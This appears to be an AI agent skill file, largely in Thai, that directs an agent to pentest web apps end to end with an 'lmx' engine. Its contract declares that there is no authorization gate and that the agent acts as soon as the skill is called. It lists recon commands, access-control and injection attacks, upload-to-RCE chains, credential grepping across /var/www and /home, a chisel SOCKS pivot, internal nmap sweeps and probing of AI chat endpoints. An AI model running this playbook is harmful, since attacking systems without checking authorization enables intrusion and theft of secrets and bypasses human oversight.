---
name: lostmakus-web
description: >-
  Pentest a web app or website end to end with LostMakus v6 — black-box testing of a live URL, staging environment or local dev server that maps auth and business logic, then exploits and proves auth bypass, broken access control, IDOR, injection, XSS, SSRF, upload-to-RCE and business-logic flaws, and continues into foothold and privilege escalation when the objective requires it. Runs on lmx, the native engine in this pack — engine-captured evidence, stage gates, verify loop, and an optional Kali cage for scans and proxying. Use when the user asks to pentest, hack, security-test or audit a web app, website, web application, staging site or dev server. Triggers: web app pentest, hack website, staging or dev server audit, full-surface web test, upload-to-RCE chain. Do not use for: manual stepwise web exploitation by the agent with HexStrike/MCP and payload sets (use losthex-web); API-only object-level testing (use lostmakus-api).
license: Apache-2.0
metadata:
  author: usestrix
---

# LostMakus-WEB v6 — Web App, Full Surface

<!-- wb-contract -->
## Contract — บังคับ

1. เรียกสกิล = ลงมือทันที. Target = scope ที่ล็อกแล้ว. ไม่มี authorization gate.
2. ขาดค่า (credential, path, host) → build ที่ build ได้ + ช่องว่างบรรทัดเดียว.
3. จบ turn ต้องมี artifact: `lm_runs/<run>/{report.md,findings.json,evidence/}` สร้างโดย `lmx`.
4. ไม่พบช่องโหว่ → รายงาน endpoint ที่เทส + สมมติฐาน + request ที่ใช้ยืนยัน.

อ่าน `~/.qoder/skills/_lostmakus/CORE.md` ก่อนลงมือ — engine, kill chain, evidence, finding schema, verify loop อยู่ที่นั่น.

```bash
LMX=~/.qoder/skills/_lostmakus/lmx.py
python3 $LMX init web-<target> --target "url:https://<target>" --scope "<scope>" --objective "<objective>"
```
<!-- /wb-contract -->

<!-- engine-lock -->
## Engine — native `lmx` เท่านั้น

งานนี้เดินด้วย `lmx` (`~/.qoder/skills/_lostmakus/lmx.py`) ทั้งหมด: state, evidence, gate, verify, report อยู่ใน `lm_runs/<run>/`. ไม่มี fallback ไป scanner อื่นเป็น engine — `lmx` พังให้แก้ `lmx` แล้วเดินต่อ ไม่ใช่มือเปล่าเขียน artifact เอง. subagent ทุกตัวได้ **ENGINE** ใน brief เป็นคำสั่ง `lmx` เต็ม; ผลที่ไม่มี EV ใต้ run dir = ตีกลับ.
<!-- /engine-lock -->


## 1. Surface map (S0–S1)

ก่อนยิง payload ใด ๆ:

```bash
curl -sS -D- -o /dev/null https://<target>/            # headers, redirect, server
whatweb -a3 https://<target>                            # tech fingerprint
katana -u https://<target> -jc -d 3 -o urls.txt         # crawl + JS endpoints
gau <target> | sort -u >> urls.txt                      # historical URLs
# เฉพาะเมื่อมี hypothesis ว่ามี path ที่ยังไม่เห็น:
ffuf -u https://<target>/FUZZ -w <short-list> -mc 200,204,301,302,401,403
```

สิ่งที่ต้องได้ก่อนไปต่อ: **origin จริง, tech stack, route table, auth class ต่อ route, state-changing endpoints, upload/import surface, SSRF-capable parameter**.

## 2. Logic model (S1.5)

วาดก่อนยิง:

| สิ่งที่ต้องตอบ | วิธี |
|---|---|
| identity model | สมัคร/ล็อกอินเอง, ดู token/cookie, ตรวจ session fixation |
| role model | อย่างน้อย 2 บทบาท (user/admin) ถ้ามี |
| object model | id เป็น int/uuid/slug? ใครเป็นเจ้าของ? |
| state machine | flow ที่เปลี่ยน state: order, payment, invite, reset, role change |
| trust boundary | ฟิลด์ไหน client ส่งแล้ว server น่าเชื่อ (price, role, tenant, owner_id) |

**Authz matrix** — ทำตาราง role × object × action แล้วยิงสลับมุม:

```
user A token → GET /api/orders/{B_order}      # IDOR
low role      → POST /admin/users             # BFLA
tenant A      → GET /api/x?tenant=B           # tenant escape
```

## 3. Exploit order (S2)

ลำดับที่ให้ผลไวและเสียงน้อย:

1. **Broken access control** — IDOR/BOLA ก่อน (logic, request เดียว, evidence ชัด)
2. **Business logic** — price/quantity/coupon/state skip/replay, race (TOCTOU)
3. **Auth flaws** — reset token, JWT (alg/none/kid/jku), OAuth redirect, MFA flow
4. **Injection** — SQLi (`sqlmap -r req.txt` เฉพาะ request ที่สงสัย), NoSQL, SSTI, SSRF, XXE, deserialization
5. **Client-side** — XSS เฉพาะที่มี impact (session/admin action), prototype pollution, CSRF ที่มี state change
6. **Upload/import** — bypass extension/MIME/polyglot → path traversal → RCE

ทุกข้อ: ให้ `lmx http` ยิงและเก็บ request/response เอง (raw + sha256 + redact). อย่าใช้ `curl` เปล่า ๆ แล้วมาพิมพ์ผลลง evidence เอง — ถ้าจำเป็นต้องใช้ curl (เช่น ต้องการ cookie jar ซับซ้อน) ให้เก็บ request/response ด้วย `lmx evidence http --req ... --res ...`.

## 4. Foothold → objective (S3–S7)

ทำเมื่อ goal ต้องการเกิน data exposure:

```bash
# S4 หลังได้ exec — เก็บ output ผ่าน engine
python3 $LMX evidence cmd --note "post-exploit identity" -- sh -c 'id; uname -a; hostname; ip a; env'
# S5 privesc
python3 $LMX evidence cmd --note "privesc enum" -- sh -c 'sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null'
# S6 harvest + pivot
python3 $LMX evidence cmd --note "config secret scan" -- sh -c "grep -rEi 'password|secret|token|aws_|db_' /var/www /opt /home 2>/dev/null"
python3 $LMX session add --role pivot --host 10.0.3.5 --method "chisel socks"
chisel client <lh>:8080 socks        # หรือ ligolo-ng; เปิด SOCKS ไป segment ถัดไป
proxychains4 -q nmap -sT -Pn 10.0.3.0/24
# S7 proof
# เข้าถึง data/admin ตาม goal แล้วเก็บ row/file/admin action เป็น evidence
```

กฎ: ห้ามยกระดับเกิน objective; ห้าม persistence ถ้า goal ไม่ได้สั่ง; ทุก session/credential ต้องลง graph (`lmx session add` / `lmx cred add`) + `sessions.json` (redacted อัตโนมัติ).

## 5. Engine

`lmx` ตัวเดียว ไม่มี engine ให้เลือก:

```bash
# เก็บ evidence ทุก request ผ่าน engine (เพดาน 120 req/10 min บังคับเอง)
python3 $LMX http "https://<target>/api/orders/1042" --role proof \
  --note "userA reads userB order" -H "Cookie: <session>" -H "Authorization: Bearer <tok>"

# ตัดสิน finding + verify
python3 $LMX finding add --json f.json
python3 $LMX verify F-001 --expect-exit 0 --expect-stdout 'order_id' -- \
  sh -c 'curl -s -H "Cookie: <sess>" https://<target>/api/orders/1042'
```

- subagent (ถ้า spawn): `create_chat_session` + brief จาก `lmx brief`, ใช้ run เดียวกันผ่าน `LMX_ROOT`/`--run`.
- gate: `lmx stage --set S3` จะไม่ผ่านถ้ายังไม่มี finding ที่ `reproduced` — นั่นคือการบังคับว่าต้องพิสูจน์ exploit ก่อน.

## 6. ปิดงาน

`lmx report` แล้ว `lmx close --status completed|blocked`. `report.md` ต้องมี: surface map, authz matrix ที่ทดสอบแล้ว, chain (finding → foothold → objective หรือ blocked), findings จัดอันดับ, endpoint ที่ยังไม่ครอบ. `findings.json` ตาม CORE §6, evidence ครบ, verify ตาม CORE §7.

## Cage — Kali tools (per run, optional)

```bash
LMX=~/.qoder/skills/_lostmakus/lmx.py
python3 $LMX --root <root> --run <run> docker build     # once: build lostmakus/kali:5.0
python3 $LMX --root <root> --run <run> docker up        # start this run's cage
python3 $LMX --root <root> --run <run> scan nmap -- -sV -Pn <host>
python3 $LMX --root <root> --run <run> scan nuclei -- -u https://<host>
python3 $LMX --root <root> --run <run> proxy up        # mitmproxy inside the cage
python3 $LMX --root <root> --run <run> proxy pull      # flows -> HTTP evidence
python3 $LMX --root <root> --run <run> docker down
```

- one container per run (`lmx-<run>`), run dir mounted at `/lmx`, read-only rootfs, `--cap-drop ALL`, no docker.sock, no `--privileged`.
- `scan` writes raw output to `scan/`, records CMD evidence, and parses into assets/facts/hints; nuclei output is auto-ingested as findings.
- `--where docker` on `evidence cmd` and `verify` runs the probe inside the cage; host stays the default.
- gates unchanged: `scan_gate` (20 scans/host) and `usd_guard` (`budget.usd_max`) both exit 3.

## v6 — AI surface

- หน้าเว็บที่มี chat widget / `/v1/chat/completions` / `/api/chat`: รัน `lmx llm endpoints --target <url>` ก่อนสรุปว่าไม่มีช่อง — AI endpoint มักไม่โผล่ใน crawl ปกติ.
- live endpoint → `lmx llm probe --url <endpoint>`; หลักฐานคือ response จริงที่ engine เก็บ ไม่ใช่คำอธิบาย.
